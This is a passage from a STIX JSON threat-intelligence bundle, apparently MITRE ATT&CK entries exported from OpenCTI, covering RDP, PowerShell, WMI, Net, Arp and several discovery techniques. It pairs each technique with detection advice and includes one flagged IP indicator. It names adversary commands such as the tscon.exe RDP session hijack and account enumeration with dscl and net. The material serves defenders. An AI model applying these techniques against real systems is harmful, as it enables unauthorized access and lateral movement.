"[Systeminfo](https://attack.mitre.org/software/S0096) is a Windows utility that can be used to gather detailed information about a computer. (Citation: TechNet Systeminfo)", "aliases": ["systeminfo.exe", "Systeminfo"], "labels": ["tool"], "external_references": [{"source_name": "TechNet Systeminfo", "description": "Microsoft. (n.d.). Systeminfo. Retrieved April 8, 2016.", "url": "https://technet.microsoft.com/en-us/library/bb491007.aspx"}, {"source_name": "mitre-attack", "url": "https://attack.mitre.org/software/S0096", "external_id": "S0096"}], "x_opencti_id": "c65cc721-e763-4e89-8a44-06950e054e0d", "type": "tool", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"id": "attack-pattern--42052935-d06a-5afe-acb1-50004e705b56", "spec_version": "2.1", "revoked": true, "confidence": 15, "created": "2017-05-31T21:30:59.769Z", "modified": "2022-08-15T14:14:05.574Z", "name": "Remote Desktop Protocol", "description": "Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.\n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)\n\nAdversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)", "aliases": ["Remote Desktop Protocol"], "x_mitre_platforms": ["Windows"], "x_mitre_permissions_required": ["Remote Desktop Users", "User"], "x_mitre_detection": "Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\n\nAlso, set up process monitoring for <code>tscon.exe</code> usage and monitor service creation that uses <code>cmd.exe /k</code> or <code>cmd.exe /c</code> in its arguments to prevent RDP session hijacking.", "x_mitre_id": "T1076", "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "lateral-movement", "x_opencti_order": 0}], "external_references": [{"source_name": "TechNet Remote Desktop Services", "description": "Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.", "url": "https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx"}, {"source_name": "RDP Hijacking Korznikov", "description": "Korznikov, A. (2017, March 17). Passwordless RDP Session Hijacking Feature All Windows versions. Retrieved December 11, 2017.", "url": "http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html"}, {"source_name": "capec", "url": "https://capec.mitre.org/data/definitions/555.html", "external_id": "CAPEC-555"}, {"source_name": "Alperovitch Malware", "description": "Alperovitch, D. (2014, October 31). Malware-Free Intrusions. Retrieved November 4, 2014.", "url": "http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/"}, {"source_name": "mitre-attack", "url": "https://attack.mitre.org/techniques/T1076", "external_id": "T1076"}, {"source_name": "RDP Hijacking Medium", "description": "Beaumont, K. (2017, March 19). RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation. Retrieved December 11, 2017.", "url": "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6"}, {"source_name": "Kali Redsnarf", "description": "NCC Group PLC. (2016, November 1). Kali Redsnarf. Retrieved December 11, 2017.", "url": "https://github.com/nccgroup/redsnarf"}], "x_opencti_id": "43f7db6e-4330-4bd7-ba8a-39363121b51d", "type": "attack-pattern", "object_marking_refs": ["marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d", "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"]}, {"id": "ipv4-addr--933cacb5-c023-527b-a89f-28a1a55b4ea4", "spec_version": "2.1", "x_opencti_score": 50, "value": "23.81.246.84", "labels": ["cve202144077", "plink"], "x_opencti_id": "f9828ae3-4038-4aa9-9937-3f0387a5782e", "type": "ipv4-addr", "object_marking_refs": ["marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"]}, {"id": "attack-pattern--95b0200a-aaf6-5557-b19b-6034e2b82c97", "spec_version": "2.1", "revoked": true, "confidence": 15, "created": "2017-05-31T21:31:06.512Z", "modified": "2022-04-27T05:00:41.469Z", "name": "PowerShell", "description": "PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)", "x_mitre_platforms": ["Windows"], "x_mitre_permissions_required": ["Administrator", "User"], "x_mitre_detection": "If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features. (Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.", "x_mitre_id": "T1086", "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "execution", "x_opencti_order": 0}], "external_references": [{"source_name": "mitre-attack", "url": "https://attack.mitre.org/techniques/T1086", "external_id": "T1086"}, {"source_name": "TechNet PowerShell", "description": "Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.", "url": "https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx"}, {"source_name": "FireEye PowerShell Logging 2016", "description": "Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.", "url": "https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html"}, {"source_name": "Microsoft PSfromCsharp APR 2014", "description": "Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.", "url": "https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/"}, {"source_name": "Github PSAttack", "description": "Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.", "url": "https://github.com/jaredhaight/PSAttack"}, {"source_name": "Powersploit", "description": "PowerSploit. (n.d.). Retrieved December 4, 2014.", "url": "https://github.com/mattifestation/PowerSploit"}, {"source_name": "SilentBreak Offensive PS Dec 2015", "description": "Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.", "url": "https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/"}, {"source_name": "Sixdub PowerPick Jan 2016", "description": "Warner, J.. (2015, January 6). Inexorable PowerShell \u2013 A Red Teamer\u2019s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.", "url": "http://www.sixdub.net/?p=367"}, {"source_name": "Malware Archaeology PowerShell Cheat Sheet", "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.", "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf"}], "x_opencti_id": "2386cc3d-8f3e-44ab-a103-b762cc69e7e7", "type": "attack-pattern", "object_marking_refs": ["marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"id": "attack-pattern--fb5adb10-bb73-5267-a0a8-7f5339fcd4fe", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2017-05-31T21:31:04.307Z", "modified": "2022-08-15T14:13:59.767Z", "name": "System Information Discovery", "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the `systemsetup` configuration tool on macOS. As an example, adversaries with user-level access can execute the `df -aH` command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information.(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)", "aliases": ["System Information Discovery"], "x_mitre_platforms": ["IaaS", "Linux", "Network", "Windows", "macOS"], "x_mitre_permissions_required": ["User"], "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather  detailed system information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.", "x_mitre_id": "T1082", "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "discovery", "x_opencti_order": 0}], "external_references": [{"source_name": "20 macOS Common Tools and Techniques", "description": "Phil Stokes. (2021, February 16). 20 Common Tools & Techniques Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.", "url": "https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/"}, {"source_name": "US-CERT-TA18-106A", "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.", "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A"}, {"source_name": "mitre-attack", "url": "https://attack.mitre.org/techniques/T1082", "external_id": "T1082"}, {"source_name": "capec", "url": "https://capec.mitre.org/data/definitions/312.html", "external_id": "CAPEC-312"}, {"source_name": "Google Instances Resource", "description": "Google. (n.d.). Rest Resource: instance. Retrieved March 3, 2020.", "url": "https://cloud.google.com/compute/docs/reference/rest/v1/instances"}, {"source_name": "Microsoft Virutal Machine API", "description": "Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019.", "url": "https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get"}, {"source_name": "Amazon Describe Instance", "description": "Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020.", "url": "https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html"}, {"source_name": "OSX.FairyTale", "description": "Phile Stokes. (2018, September 20). On the Trail of OSX.FairyTale | Adware Playing at Malware. Retrieved August 24, 2021.", "url": "https://www.sentinelone.com/blog/trail-osx-fairytale-adware-playing-malware/"}], "x_opencti_id": "651da13d-7e7e-422a-ba58-a5c5bfe6bfdd", "type": "attack-pattern", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9", "marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"id": "attack-pattern--cbf0c8ca-5d6a-53be-b391-93f861e48d47", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2017-05-31T21:30:35.733Z", "modified": "2022-08-17T08:36:29.072Z", "name": "System Owner/User Discovery", "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including `whoami`. In macOS and Linux, the currently logged in user can be identified with `w` and `who`. On macOS the `dscl . list /Users | grep -v '_'` command can also be used to enumerate user accounts. Environment variables, such as `%USERNAME%` and `$USER`, may also be used to access this information.", "aliases": ["System Owner/User Discovery"], "x_mitre_platforms": ["Linux", "macOS", "Windows"], "x_mitre_permissions_required": ["User", "Administrator"], "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).", "x_mitre_id": "T1033", "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "discovery", "x_opencti_order": 0}], "external_references": [{"source_name": "mitre-attack", "url": "https://attack.mitre.org/techniques/T1033", "external_id": "T1033"}, {"source_name": "capec", "url": "https://capec.mitre.org/data/definitions/577.html", "external_id": "CAPEC-577"}], "x_opencti_id": "c1b772f2-c947-4b31-bf0d-5b8a4b8696f0", "type": "attack-pattern", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9", "marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"id": "tool--a58996a6-65cb-5d59-ba5a-8ae3f197f8dc", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2017-05-31T21:32:31.601Z", "modified": "2022-08-15T14:13:40.938Z", "name": "Net", "description": "The [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility)\n\n[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) using `net use` commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as `net1 user`.", "aliases": ["Net", "net.exe"], "labels": ["tool"], "external_references": [{"source_name": "mitre-attack", "url": "https://attack.mitre.org/software/S0039", "external_id": "S0039"}, {"source_name": "Savill 1999", "description": "Savill, J. (1999, March 4). Net.exe reference. Retrieved September 22, 2015.", "url": "http://windowsitpro.com/windows/netexe-reference"}, {"source_name": "Microsoft Net Utility", "description": "Microsoft. (2006, October 18). Net.exe Utility. Retrieved September 22, 2015.", "url": "https://msdn.microsoft.com/en-us/library/aa939914"}], "x_opencti_id": "968946d2-e343-4ba1-b221-7f7a338ea872", "type": "tool", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"id": "attack-pattern--0e3468b8-dc0e-508c-8214-b1da569c42f8", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2017-05-31T21:30:44.329Z", "modified": "2022-08-15T14:13:49.494Z", "name": "Windows Management Instrumentation", "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)", "aliases": ["Windows Management Instrumentation"], "x_mitre_platforms": ["Windows"], "x_mitre_permissions_required": ["User", "Administrator"], "x_mitre_detection": "Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)", "x_mitre_id": "T1047", "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "execution", "x_opencti_order": 0}], "external_references": [{"source_name": "FireEye WMI SANS 2015", "description": "Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020.", "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf"}, {"source_name": "mitre-attack", "url": "https://attack.mitre.org/techniques/T1047", "external_id": "T1047"}, {"source_name": "FireEye WMI 2015", "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.", "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"}, {"source_name": "MSDN WMI", "description": "Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.", "url": "https://msdn.microsoft.com/en-us/library/aa394582.aspx"}], "x_opencti_id": "f1044e1d-ede1-49ce-b439-f7de0d7283e7", "type": "attack-pattern", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9", "marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"id": "attack-pattern--a9f45d33-1027-5ed5-8297-8f7969861016", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2017-05-31T21:30:21.315Z", "modified": "2022-08-15T14:13:58.750Z", "name": "System Service Discovery", "description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as `sc query`, `tasklist /svc`, `systemctl --type=service`, and `net start`.\n\nAdversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "aliases": ["System Service Discovery"], "x_mitre_platforms": ["Linux", "Windows", "macOS"], "x_mitre_permissions_required": ["User", "Administrator", "SYSTEM"], "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).", "x_mitre_id": "T1007", "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "discovery", "x_opencti_order": 0}], "external_references": [{"source_name": "capec", "url": "https://capec.mitre.org/data/definitions/574.html", "external_id": "CAPEC-574"}, {"source_name": "mitre-attack", "url": "https://attack.mitre.org/techniques/T1007", "external_id": "T1007"}], "x_opencti_id": "3cd7fc7f-a17f-4642-96d9-8d048ca6d24f", "type": "attack-pattern", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9", "marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}, {"id": "tool--14c7dce1-ff3b-5ed2-ab82-784e09c62bb1", "spec_version": "2.1", "revoked": false, "confidence": 15, "created": "2017-05-31T21:33:02.428Z", "modified": "2022-08-15T14:13:42.872Z", "name": "Arp", "description": "[Arp](https://attack.mitre.org/software/S0099) displays and modifies information about a system's Address Resolution Protocol (ARP) cache. (Citation: TechNet Arp)", "aliases": ["Arp", "arp.exe"], "labels": ["tool"], "external_references": [{"source_name": "mitre-attack", "url": "https://attack.mitre.org/software/S0099", "external_id": "S0099"}, {"source_name": "TechNet Arp", "description": "Microsoft. (n.d.). Arp. Retrieved April 17, 2016.", "url": "https://technet.microsoft.com/en-us/library/bb490864.aspx"}], "x_opencti_id": "cdbd8a48-d96c-49f2-8f43-87e94657309e", "type": "tool", "created_by_ref": "identity--f11b0831-e7e6-5214-9431-ccf054e53e94", "object_marking_refs": ["marking-definition--47645da4-afb2-5733-bafb-f7cd98ec4e7d"]}]}